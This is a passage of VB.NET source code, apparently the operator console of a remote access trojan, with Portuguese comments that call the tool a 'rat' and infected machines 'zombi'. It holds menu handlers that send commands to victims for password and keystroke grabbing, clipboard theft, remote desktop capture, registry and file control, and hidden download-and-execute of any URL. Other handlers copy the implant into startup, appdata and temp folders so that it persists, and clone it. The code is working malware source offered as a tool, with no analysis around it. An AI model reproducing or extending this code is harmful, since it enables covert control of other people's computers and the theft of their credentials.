                            ElseIf itm.Text.EndsWith(".ide") Or itm.Text.EndsWith(".ide") Or itm.Text.EndsWith(".sdi") Or itm.Text.EndsWith(".uce") Or itm.Text.EndsWith(".NLS") Or itm.Text.EndsWith(".jrs") Or itm.Text.EndsWith(".bin") Or itm.Text.EndsWith(".tlb") Or itm.Text.EndsWith(".ax") Or itm.Text.EndsWith(".rs") Or itm.Text.EndsWith(".Manifest") Or itm.Text.EndsWith(".prx") Or itm.Text.EndsWith(".sig") Or itm.Text.EndsWith(".BAK") Or itm.Text.EndsWith(".cpsh") Or itm.Text.EndsWith(".cvsh") Or itm.Text.EndsWith(".m3danim") Or itm.Text.EndsWith(".wyc") Or itm.Text.EndsWith(".InstallLog") Or itm.Text.EndsWith(".InstallState") Then
                                itm.ImageIndex = 62
                            ElseIf itm.Text.EndsWith(".ico") Or itm.Text.EndsWith(".ICO") Then
                                itm.ImageIndex = 63
                            ElseIf itm.Text.EndsWith(".swf") Or itm.Text.EndsWith(".SWF") Then
                                itm.ImageIndex = 64
                            ElseIf itm.Text.EndsWith(".APK") Or itm.Text.EndsWith(".apk") Then
                                itm.ImageIndex = 58
                            Else
                                itm.ImageIndex = 8 'not ache extencions mostre ImageIndex 8
                            End If
                            fff.ListView1.Items.Add(itm) 'add
                            i += 1
                        Next
                    End If
                    'regedit open
                Case "openRG"
                    Dim reg As Reg = My.Application.OpenForms("Reg" & sock)
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim regi As New Reg
                    regi.Name = "Reg" & sock
                    regi.sock = sock
                    regi.Text = "Regedit " & Me.l1.Items.Item(0).SubItems.Item(2).Text & "/" & Me.l1.Items.Item(0).SubItems.Item(3).Text & " " & s.IP(sock) 'nome + user/computer + ip
                    regi.Show()
                    'regedit
                Case "RG"
                    Dim reg As Reg = My.Application.OpenForms("Reg" & sock)
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf Me.data)
                        Me.Invoke(j, New Object() {Me.sock, b})
                        Exit Sub
                    End If
                    Select Case a(1)
                        Case "~"
                            reg.RGk.Enabled = True
                            reg.RGLIST.Enabled = True
                            reg.RGk.SelectedNode.Nodes.Clear()
                            reg.RGLIST.Items.Clear()
                            Dim num20 As Integer = (a.Length - 1)
                            Dim i As Integer = 3
                            Do While (i <= num20)
                                Try
                                    If (a(i).Length > 0) Then
                                        If a(i).Contains("/") Then
                                            Dim strArray2 As String() = Strings.Split(a(i), "/", -1, CompareMethod.Binary)
                                            Dim item As ListViewItem = reg.RGLIST.Items.Add(strArray2(0))
                                            item.SubItems.Add(strArray2(1))
                                            Try
                                                item.SubItems.Add(strArray2(2))
                                            Catch exception17 As Exception

                                                Dim exception3 As Exception = exception17

                                            End Try
                                            If (strArray2(1) = "String") Then
                                                item.ImageIndex = 1
                                            Else
                                                item.ImageIndex = 2
                                            End If
                                        Else
                                            reg.RGk.SelectedNode.Nodes.Add(a(i))
                                        End If
                                    End If
                                Catch exception18 As Exception
                                    Dim exception4 As Exception = exception18
                                End Try
                                i += 1
                            Loop
                            reg.RGk.SelectedNode.Expand()
                            reg.RGk.Select()
                            reg.RGk.Focus()
                            Dim num21 As Integer = (reg.RGLIST.Columns.Count - 1)
                            Dim j As Integer = 0
                            Do While (j <= num21)
                                reg.RGLIST.Columns.Item(j).AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize)
                                j += 1
                            Loop
                            Exit Select
                    End Select
                Case "infoDesk" 'capture descktop brevia
                    Dim m As New MemoryStream(Convert.FromBase64String(a(1)))
                    SyncLock PictureBox6
                        Me.PictureBox6.Image = Image.FromStream(m)
                    End SyncLock
                    pinger = 0
                    Me.Timer3.Stop()
                    Me.Timer3.Enabled = False

                    'menssagems 

                    'downloadedfile manager
                Case "downloadedCompletado"
                    MessageBox.Show(a(1), "Completado", MessageBoxButtons.OK, MessageBoxIcon.Asterisk) 'mensagem

                Case "downloadedfileErro!"
                    MessageBox.Show(a(1), "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Error) 'mensagem Erro

                    'upload file manager
                Case "sendfileto"
                    MessageBox.Show(a(1), "Completado", MessageBoxButtons.OK, MessageBoxIcon.Asterisk) 'mensagem

                Case "sendfiletoErro!"
                    MessageBox.Show(a(1), "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Error) 'mensagem Erro

                    'enviar e executar direto ssd hd
                Case "sendfile!"
                    MessageBox.Show(a(1), "Completado", MessageBoxButtons.OK, MessageBoxIcon.Asterisk) 'mensagem

                Case "sendfileErro!"
                    MessageBox.Show(a(1), "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Error) 'mensagem Erro

                    'enviar e executar upload direto por lik
                Case "D+r!"
                    MessageBox.Show(a(1), "Completado", MessageBoxButtons.OK, MessageBoxIcon.Asterisk) 'mensagem

                Case "D+rErro!"
                    MessageBox.Show(a(1), "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Error) 'mensagem Erro

                    'abri URL
                Case "openurl!"
                    MessageBox.Show(a(1), "URL Aberta", MessageBoxButtons.OK, MessageBoxIcon.Asterisk) 'mensagem

                Case "openurlErro!"
                    MessageBox.Show(a(1), "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Error) 'mensagem Erro

                    'Start Processo / process manager
                Case "openur2!"
                    MessageBox.Show(a(1), "Iniciado !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk) 'mensagem

                Case "openur2Erro!"
                    MessageBox.Show(a(1), "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Error) 'mensagem Erro

                    'execute file manager
                Case "Execute!"
                    MessageBox.Show(a(1), "Sucesso !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk) 'mensagem

                Case "ExecuteErro!"
                    MessageBox.Show(a(1), "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Error) 'mensagem Erro

                    'delete file manager
                Case "Delete!"
                    MessageBox.Show(a(1), "Sucesso !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk) 'mensagem

                Case "DeleteErro!"
                    MessageBox.Show(a(1), "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Error) 'mensagem Erro

                    'hide e show file manager
                Case "hidefolderfile!"
                    MessageBox.Show(a(1), "Sucesso !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk) 'mensagem

                Case "hidefolderfileErro!"
                    MessageBox.Show(a(1), "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Error) 'mensagem Erro

                    'criar nava pasta file manager
                Case "creatnewfolder!"
                    MessageBox.Show(a(1), "Sucesso !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk) 'mensagem

                Case "creatnewfolderErro!"
                    MessageBox.Show(a(1), "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Error) 'mensagem Erro

                    'renomear file manager
                Case "Rename!"
                    MessageBox.Show(a(1), "Sucesso !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk) 'mensagem

                Case "RenameErro!"
                    MessageBox.Show(a(1), "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Error) 'mensagem Erro
            End Select
        Catch ex As Exception 'erro
            Me.ListBox1.Items.Add("Erro Desktop Brevia !") 'logs
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
    End Sub
#End Region

    Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In Me.l1.SelectedItems
                Dim dr As DialogResult = MessageBox.Show("    Remover o Server ?", "Uninstall", MessageBoxButtons.YesNo, MessageBoxIcon.Error)
                If dr = DialogResult.Yes Then
                    s.Send(x.ToolTipText, "Uninstall") 'chamar Uninstall
                    Me.ListBox1.Items.Add("Server Foi Removido ! Ip:" + s.IP(sock) + " Date Day" + My.Computer.Clock.LocalTime) 'logs
                    MessageBox.Show("O Server Sera Removido ", "Uninstall", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
                End If
            Next
        Catch ex As Exception
        End Try
    End Sub

    Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In Me.l1.SelectedItems
                Dim dr As DialogResult = MessageBox.Show("    Restart Server ?", "Restart Server", MessageBoxButtons.YesNo, MessageBoxIcon.Question)
                If dr = DialogResult.Yes Then
                    s.Send(x.ToolTipText, "restartserver") 'chamar restart server
                    Me.ListBox1.Items.Add("Server Foi Reiniciado ! Ip:" + s.IP(sock) + " Date Day" + My.Computer.Clock.LocalTime) 'logs
                    MessageBox.Show("O Server Sera Reiniciado ", "Restart", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
                End If
            Next
        Catch ex As Exception
        End Try
    End Sub

    Private Sub CloseToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem1.Click
        Try
            For Each x As ListViewItem In Me.l1.SelectedItems
                Dim dr As DialogResult = MessageBox.Show("    Close Server ?", "Close Server", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation)
                If dr = DialogResult.Yes Then
                    s.Send(x.ToolTipText, "closeserver") 'chamar Close Server
                    Me.ListBox1.Items.Add("Server Foi Fechado ! Ip:" + s.IP(sock) + " Date Day" + My.Computer.Clock.LocalTime) 'logs
                    MessageBox.Show("O Server Sera Fechado ", "Kill", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
                End If
            Next
        Catch ex As Exception
        End Try
    End Sub

    Private Sub RegeditToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RegeditToolStripMenuItem.Click
        'abri URL em computer
        For Each x As ListViewItem In Me.l1.SelectedItems
            Dim wwwsite As String = InputBox("Enter Website", "Site", "www.google.com")
            If wwwsite = "" Then
                MessageBox.Show("   A URL Não Cera Aberta", "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'mensagem  
            Else
                'ok = comando 
                s.Send(x.ToolTipText, "openurl" & yy & wwwsite)
            End If
        Next
    End Sub

    Private Sub HideExecutavelToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HideExecutavelToolStripMenuItem.Click
        'enviar arquivo por HD ou ssd + hide executavel
        Try
            For Each x As ListViewItem In Me.l1.SelectedItems
                Dim o As New OpenFileDialog
                If o.ShowDialog() = Windows.Forms.DialogResult.OK Then
                    Dim n As New FileInfo(o.FileName)
                    If o.FileName.Length > 0 Then
                    End If
                    s.Send(x.ToolTipText, "sendfile" & yy & n.Name & yy & Convert.ToBase64String(File.ReadAllBytes(o.FileName)))
                Else
                    MessageBox.Show("O Arquivo Não Cera Enviado", "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
                End If
            Next
        Catch ex As Exception
        End Try
    End Sub

    Private Sub NormalExecutavelToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NormalExecutavelToolStripMenuItem.Click
        'enviar arquivo por HD ou ssd + executavel normal
        Try
            For Each x As ListViewItem In Me.l1.SelectedItems
                Dim o As New OpenFileDialog
                If o.ShowDialog() = Windows.Forms.DialogResult.OK Then
                    Dim n As New FileInfo(o.FileName)
                    If o.FileName.Length > 0 Then
                    End If
                    s.Send(x.ToolTipText, "sendfile2" & yy & n.Name & yy & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
                Else
                    MessageBox.Show("O Arquivo Não Cera Enviado", "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
                End If
            Next
        Catch ex As Exception
        End Try
    End Sub

    Private Sub ExecuteHideToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExecuteHideToolStripMenuItem.Click
        'enviar arquivo por Enternet URL + hide executavel
        Try
            For Each x As ListViewItem In Me.l1.SelectedItems
                Dim name As String = InputBox("URL", "URL", "URL")
                Dim r As New Random
                Dim p As String = r.Next(0, 200)
                If name = "" Then
                    MessageBox.Show("O Arquivo Não Cera Baixado", "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
                Else
                    Me.s.Send(x.ToolTipText, "D+r" & yy & name & yy & p & ".exe")
                End If
            Next
        Catch ex As Exception
        End Try
    End Sub

    Private Sub ExecuteNormalToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExecuteNormalToolStripMenuItem.Click
        'enviar arquivo por Enternet URL + normal executavel
        Try
            For Each x As ListViewItem In Me.l1.SelectedItems
                Dim name As String = InputBox("URL", "URL", "URL")
                Dim r As New Random
                Dim p As String = r.Next(0, 200)
                If name = "" Then
                    MessageBox.Show("O Arquivo Não Cera Baixado", "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
                Else
                    s.Send(x.ToolTipText, "D+r2" & yy & name & yy & p & ".exe")
                End If
            Next
        Catch ex As Exception
        End Try
    End Sub

    Private Sub GetPassToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GetPassToolStripMenuItem.Click
        For Each x As ListViewItem In Me.l1.SelectedItems
            s.Send(x.ToolTipText, "openkl") 'chamr openkl
        Next
    End Sub

    Private Sub LogoffToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LogoffToolStripMenuItem.Click
        For Each x As ListViewItem In Me.l1.SelectedItems
            s.Send(x.ToolTipText, "Logoff") 'chamr Logoff
        Next
    End Sub

    Private Sub RestartToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem1.Click
        For Each x As ListViewItem In Me.l1.SelectedItems
            s.Send(x.ToolTipText, "Restart") 'chamr Restart
        Next
    End Sub

    Private Sub ShutdownToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShutdownToolStripMenuItem.Click
        For Each x As ListViewItem In Me.l1.SelectedItems
            s.Send(x.ToolTipText, "Shutdown") 'chamr Shutdown
        Next
    End Sub

    Private Sub GetPassToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles GetPassToolStripMenuItem1.Click
        For Each x As ListViewItem In Me.l1.SelectedItems
            s.Send(x.ToolTipText, "++") 'chamr ++
        Next
    End Sub

    Private Sub FileManagerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FileManagerToolStripMenuItem.Click
        For Each x As ListViewItem In Me.l1.SelectedItems
            s.Send(x.ToolTipText, "openfm") 'chamar senha openfm
        Next
    End Sub

    Private Sub RemoteDesktopToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
        For Each x As ListViewItem In Me.l1.SelectedItems
            s.Send(x.ToolTipText, "!") 'chamar senha !
        Next
    End Sub

    Private Sub ShowPasswordToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        For Each x As ListViewItem In Me.l1.SelectedItems
            s.Send(x.ToolTipText, "openpw") 'chamar senha openpw
        Next
    End Sub

    Private Sub ProcessManagerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ProcessManagerToolStripMenuItem.Click
        For Each x As ListViewItem In Me.l1.SelectedItems
            s.Send(x.ToolTipText, "\\") 'chamar senha \\
        Next
    End Sub

    Private Sub OffineToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OffineToolStripMenuItem.Click
        For Each x As ListViewItem In Me.l1.SelectedItems
            s.Send(x.ToolTipText, "openlo") 'chamar openlo
        Next
    End Sub

    Private Sub OlineToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OlineToolStripMenuItem.Click
        For Each x As ListViewItem In Me.l1.SelectedItems
            s.Send(x.ToolTipText, "online1") 'chamar openlo
        Next
    End Sub

    Private Sub sendtxt_Click(sender As Object, e As EventArgs) Handles sendtxt.Click
        For Each x As ListViewItem In Me.l1.SelectedItems
            s.Send(x.ToolTipText, "txtsend") 'chamar txtsend
        Next
    End Sub

    Private Sub Cmd_Click(sender As Object, e As EventArgs) Handles Cmd.Click
        For Each x As ListViewItem In Me.l1.SelectedItems
            s.Send(x.ToolTipText, "Cmdcomando") 'chamr Cmdcomando
        Next
    End Sub

    Private Sub txtsend_Click(sender As Object, e As EventArgs) Handles txtsend.Click
        For Each x As ListViewItem In Me.l1.SelectedItems
            s.Send(x.ToolTipText, "txttextsend") 'chamar
        Next
    End Sub

    Private Sub Funções_Click(sender As Object, e As EventArgs) Handles Funções.Click
        For Each x As ListViewItem In Me.l1.SelectedItems
            s.Send(x.ToolTipText, "fu") 'chamar fun
        Next
    End Sub

    Private Sub PastasCompartilhadasToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PastasCompartilhadasToolStripMenuItem.Click
        For Each x As ListViewItem In Me.l1.SelectedItems
            s.Send(x.ToolTipText, "pa") 'chamar senha pa
        Next
    End Sub

    Private Sub InformationsDoComputerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles InformationsDoComputerToolStripMenuItem.Click
        For Each x As ListViewItem In Me.l1.SelectedItems
            s.Send(x.ToolTipText, "sendinformation") 'chamar sendinformation
        Next
    End Sub

    Private Sub GetClipBoardToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GetClipBoardToolStripMenuItem.Click
        For Each x As ListViewItem In Me.l1.SelectedItems
            s.Send(x.ToolTipText, "clipss") 'charmar clipss
        Next
    End Sub

    Private Sub Regedit_Click(sender As Object, e As EventArgs) Handles Regedit.Click
        For Each x As ListViewItem In Me.l1.SelectedItems
            s.Send(x.ToolTipText, "openRG" & yy) 'open regedit /charmar openRG
        Next
    End Sub

    Private Sub ProgramasToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ProgramasToolStripMenuItem.Click
        'copy server
        For Each x As ListViewItem In Me.l1.SelectedItems
            If DialogResult.OK Then
                s.Send(x.ToolTipText, "autocopy+Desktop") 'chamr autocopy+programas
                MessageBox.Show("O Server Sera Copiado Para o Destino escolhido", "Server", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'mensagem 
            End If
        Next
    End Sub

    Private Sub AppdataToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AppdataToolStripMenuItem.Click
        'copy server
        For Each x As ListViewItem In Me.l1.SelectedItems
            If DialogResult.OK Then
                s.Send(x.ToolTipText, "autocopy+appdata") 'chamr autocopy+appdata
                MessageBox.Show("O Server Sera Copiado Para o Destino escolhido", "Server", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'mensagem 
            End If
        Next
    End Sub

    Private Sub TempToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TempToolStripMenuItem.Click
        'copy server
        For Each x As ListViewItem In Me.l1.SelectedItems
            If DialogResult.OK Then
                s.Send(x.ToolTipText, "autocopy+startup") 'chamr autocopy+temp
                MessageBox.Show("O Server Sera Copiado Para o Destino escolhido", "Server", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'mensagem 
            End If
        Next
    End Sub

    Private Sub UserProfile_Click(sender As Object, e As EventArgs) Handles UserProfile.Click
        'copy server
        For Each x As ListViewItem In Me.l1.SelectedItems
            If DialogResult.OK Then
                s.Send(x.ToolTipText, "autocopy+temp") 'chamr autocopy+temp
                MessageBox.Show("O Server Sera Copiado Para o Destino escolhido", "Server", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'mensagem 
            End If
        Next
    End Sub

    Private Sub AllCopyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AllCopyToolStripMenuItem.Click
        'alto copy server
        For Each x As ListViewItem In Me.l1.SelectedItems
            If DialogResult.OK Then
                s.Send(x.ToolTipText, "autocopy+temp") 'chamar autocopy+temp


                s.Send(x.ToolTipText, "autocopy+startup") 'chamar autocopy+startup


                s.Send(x.ToolTipText, "autocopy+appdata") 'chamar autocopy+appdata


                MessageBox.Show("O Server Sera Copiado Para os Destinos escolhidos", "Server", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'mensagem
            End If
        Next
    End Sub

    Private Sub cloneserver_Click(sender As Object, e As EventArgs) Handles cloneserver.Click
        'clonar servidor
        For Each x As ListViewItem In Me.l1.SelectedItems
            If DialogResult.OK Then
                s.Send(x.ToolTipText, "cloneserver") 'chamar cloneserver

                Me.ListBox1.Items.Add("Server Clonado ! Ip:" + s.IP(sock) + " Date Day" + My.Computer.Clock.LocalTime) 'logs

                MessageBox.Show("O Serve Serra Clonado", "Clone", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'mensagem
            End If
        Next
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Try
            If Me.Button1.Text = "Start" Then
                Me.Button1.Text = "Stop" 'butao1 = nome stop
                s = New SocketServer
                s.Start(Me.NumericUpDown1.Value)
                Me.Label2.Text = Me.NumericUpDown1.Value & " Porta ON" : Me.PictureBox2.Image = Me.PictureBox3.Image 'porta ON e imagem ON 
                Dim texto As String = Me.NumericUpDown1.Value
                Dim esc_texto As New StreamWriter(Application.StartupPath & "/Configs/config3.txt")
                esc_texto.Write(texto)
                esc_texto.Close()
                Me.Button1.ForeColor = Color.Red 'txt color vermelho
            Else
                Me.Label2.Text = Me.NumericUpDown1.Value & " Porta Off" : Me.PictureBox2.Image = Me.PictureBox4.Image 'porta off e imagem off 
                Dim texto As String = Me.NumericUpDown1.Value
                Dim esc_texto As New StreamWriter(Application.StartupPath & "/Configs/config3.txt")
                esc_texto.Write(texto)
                esc_texto.Close()
                Me.Button1.Text = "Start"
                Me.Button1.ForeColor = Color.Green 'txt color verde
                For Each x As ListViewItem In l1.Items
                    s.Disconnect(x.ToolTipText)
                Next
                s.stops()
            End If
        Catch ex As Exception 'erro
            MessageBox.Show("Aporta já Esta em Uso !", "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Error) 'mensagem
            ProjectData.SetProjectError(ex)
            Me.ListBox1.Items.Add("Erro Ao Dar Start Na Porta Do Rat !") 'logs
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub OpenMyDownloadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenMyDownloadToolStripMenuItem.Click
        'abri a pasta Download do rat
        Try
            Process.Start(Application.StartupPath & "/Download")
        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            MessageBox.Show("Erro", "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Error)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub OpenMyPastRatToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles OpenMyPastRatToolStripMenuItem1.Click
        'abri a pasta onde esta o rat
        Try
            Process.Start(Application.StartupPath)
        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            MessageBox.Show("Erro", "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Error)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub OpenMyPastConfigsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenMyPastConfigsToolStripMenuItem.Click
        'abri a pasta Configs do rat
        Try
            Process.Start(Application.StartupPath & "/Configs")
        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            MessageBox.Show("Erro", "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Error)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub OpenMyPastToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles OpenMyPastToolStripMenuItem1.Click
        'abri a pasta Download do rat
        Try
            Process.Start(Application.StartupPath & "/Download")
        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            MessageBox.Show("Erro", "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Error)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub OpenMyPastRatToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenMyPastRatToolStripMenuItem.Click
        'abri a pasta onde esta o rat
        Try
            Process.Start(Application.StartupPath)
        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            MessageBox.Show("Erro", "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Error)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub OpenMyConfigsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenMyConfigsToolStripMenuItem.Click
        'abri a pasta Configs do rat
        Try
            Process.Start(Application.StartupPath & "/Configs")
        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            MessageBox.Show("Erro", "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Error)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub CopyIPToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyIPToolStripMenuItem.Click
        'copi ip do zombi
        Try
            If Me.l1.SelectedItems.Item(0).SubItems.Item(1).Text.Length > 0 Then
                Clipboard.SetText(Me.l1.SelectedItems.Item(0).SubItems.Item(1).Text)
            End If
        Catch ex As Exception
        End Try
        MessageBox.Show("Foi Copiado", "Copiado", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'mensagem
    End Sub

    Private Sub CopyUserComputerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyUserComputerToolStripMenuItem.Click
        'copi computer do zombi
        Try
            If Me.l1.SelectedItems.Item(0).SubItems.Item(2).Text.Length > 0 Then
                Clipboard.SetText(Me.l1.SelectedItems.Item(0).SubItems.Item(2).Text)
            End If
        Catch ex As Exception
        End Try
        MessageBox.Show("Foi Copiado", "Copiado", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'mensagem
    End Sub

    Private Sub CopyUserToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyUserToolStripMenuItem.Click
        'copi user do zombi
        Try
            If Me.l1.SelectedItems.Item(0).SubItems.Item(3).Text.Length > 0 Then
                Clipboard.SetText(Me.l1.SelectedItems.Item(0).SubItems.Item(3).Text)
            End If
        Catch ex As Exception
        End Try
        MessageBox.Show("Foi Copiado", "Copiado", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'mensagem
    End Sub

    Private Sub CopyAVToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyAVToolStripMenuItem.Click
        'copi av do zombi
        Try
            If Me.l1.SelectedItems.Item(0).SubItems.Item(7).Text.Length > 0 Then
                Clipboard.SetText(Me.l1.SelectedItems.Item(0).SubItems.Item(7).Text)
            End If
        Catch ex As Exception
        End Try
        MessageBox.Show("Foi Copiado", "Copiado", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'mensagem
    End Sub

    Private Sub CopyPaisToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyPaisToolStripMenuItem.Click
        'copi pais do zombi
        Try
            If Me.l1.SelectedItems.Item(0).SubItems.Item(4).Text.Length > 0 Then
                Clipboard.SetText(Me.l1.SelectedItems.Item(0).SubItems.Item(4).Text)
            End If
        Catch ex As Exception
        End Try
        MessageBox.Show("Foi Copiado", "Copiado", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'mensagem
    End Sub

    Private Sub CopyRamToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyRamToolStripMenuItem.Click
        'copi ram do computer do zombi
        Try
            If Me.l1.SelectedItems.Item(0).SubItems.Item(9).Text.Length > 0 Then
                Clipboard.SetText(Me.l1.SelectedItems.Item(0).SubItems.Item(9).Text)
            End If
        Catch ex As Exception
        End Try
        MessageBox.Show("Foi Copiado", "Copiado", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'mensagem
    End Sub

    Private Sub CopyWindowsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyWindowsToolStripMenuItem.Click
        'copi windows do zombi
        Try
            If Me.l1.SelectedItems.Item(0).SubItems.Item(6).Text.Length > 0 Then
                Clipboard.SetText(Me.l1.SelectedItems.Item(0).SubItems.Item(6).Text)
            End If
        Catch ex As Exception
        End Try
        MessageBox.Show("Foi Copiado", "Copiado", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'mensagem
    End Sub

    Private Sub CopyIdiomaToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyIdiomaToolStripMenuItem.Click
        'copi idioma do zombi
        Try
            If Me.l1.SelectedItems.Item(0).SubItems.Item(5).Text.Length > 0 Then
                Clipboard.SetText(Me.l1.SelectedItems.Item(0).SubItems.Item(5).Text)
            End If
        Catch ex As Exception
        End Try
        MessageBox.Show("Foi Copiado", "Copiado", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'mensagem
    End Sub

    Private Sub CopyInstalDateToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyInstalDateToolStripMenuItem.Click
        'copi instal date do zombi
        Try
            If Me.l1.SelectedItems.Item(0).SubItems.Item(10).Text.Length > 0 Then
                Clipboard.SetText(Me.l1.SelectedItems.Item(0).SubItems.Item(10).Text)
            End If
        Catch ex As Exception
        End Try
        MessageBox.Show("Foi Copiado", "Copiado", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'mensagem
    End Sub

    Private Sub L1_ColumnClick(ByVal sender As Object, ByVal e As System.Windows.Forms.ColumnClickEventArgs)
        'Determine if the clicked column is already the column that is 
        'being sorted.
        Try
            If (e.Column = lvwColumnSorter.SortColumn) Then
                'Reverse the current sort direction for this column.
                If (lvwColumnSorter.Order = SortOrder.Ascending) Then
                    lvwColumnSorter.Order = SortOrder.Descending
                Else
                    lvwColumnSorter.Order = SortOrder.Ascending
                End If
            Else
                'Set the column number that is to be sorted; default to ascending.
                lvwColumnSorter.SortColumn = e.Column
                lvwColumnSorter.Order = SortOrder.Ascending
            End If
            'Perform the sort with these new sort options.
            Me.l1.Sort()
        Catch ex As Exception
        End Try
    End Sub

    Private Sub ToolStripStatusLabel3_Click_1(sender As Object, e As EventArgs) Handles ToolStripStatusLabel3.Click
        opções.Show() 'abri forme
    End Sub

    Private Sub ToolStripStatusLabel4_Click_1(sender As Object, e As EventArgs) Handles ToolStripStatusLabel4.Click
        Aborte.Show() 'abri forme
    End Sub

